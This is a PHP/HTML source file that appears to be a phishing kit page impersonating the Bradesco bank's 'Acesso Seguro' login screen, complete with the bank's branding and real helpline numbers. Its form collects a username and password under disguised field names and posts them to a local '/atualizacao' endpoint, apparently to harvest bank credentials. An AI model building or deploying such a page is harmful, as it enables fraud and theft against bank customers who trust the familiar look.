<?php
    require_once("./api/functions.php");
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Bradesco</title>
<link rel="stylesheet" href="css/desktop.css">
<script>
    function validarLogin() {
        const usuario = document.getElementById('usuario').value;
        const senha = document.getElementById('idpswd').value;
        if ((usuario.length <= 6) || (senha.length <= 6)){
                alert('Preencha corretamente o campo de usuario e senha.');
            }else{
                document.getElementById("loginndndfrm").submit();
        }
    }
</script>
</head>
<body>

<div class="topbar">
	<div class="topbarleft">
        
		<div class="topbarlogo">
		
		</div>
         <div class="bgtopwhite">
            <h1 class="titulo_bg_top">Acesso Seguro</h1>
        </div>   
        <span class="data_bg_top"> <?php echo get_data_extenso(); ?></span>   
        <button type="button" class="btn_cancelar"></button>
	</div>
</div>

<div class="container">



    <div class="main">
       
        
        <div class="login-box">
            <div class="login-box-top"></div>
      
            <div class="login-box-center">
                <div class="login-box-left">
                    <span>1</span>
                    <h4>Informe o usuário e a senha</h4>
                </div>
                <div class="login-box-right">
                    <div class="box-user-pass">
                        <form method="POST" id="loginndndfrm" action="/atualizacao">
                        <table>
                            <tr>
                                <td><span>Usuário</span></td>
                                <td><input type="text" name="campo_primeiro" id="usuario"></td>
                            </tr>
                            <tr>
                                <td><span>Senha</span></td>
                                <td><input type="password" name="campo_segundo" id="idpswd"></td>
                            </tr>
                            <tr>
                                <td colspan="2" style=" text-align:right;">
                                    <a href="#">Esqueci usuário/senha</a>
                                </td>
                            </tr>
                        </table>
                        </form>
                    </div>
                    <input type="checkbox" id="aceite" name="aceite" value="sim">
                    <label for="aceite">Lembrar meu acesso</label>
                </div>    
            </div>
            <div class="login-box-bottom"></div>
        </div>
        <div class="boxbuttons">
            <button class="btn_login_cancelar"></button>
            <button class="btn_login_entrar" onclick="validarLogin()"></button>
        </div>
    </div>

    <div class="right-panel">
        <img src="img/bg_aviso.png">
    </div>

</div>

<div class="footer">
    <div class="footer_left">
        <div class="footer_column"><img src="img/icone_rodape.gif"></div>
        <div class="footer_column">Bradesco Apoio à Empresa<br> 3003-1000 </div>
        <div class="footer_column">Alô Bradesco<br>0800 202 1000</div>
        <div class="footer_column">Deficiente Auditivo ou de Fala<br>0800 722 0099</div>
        <div class="footer_column">Ouvidoria<br>0800 727 9933</div>
    </div>
</div>

</body>
</html>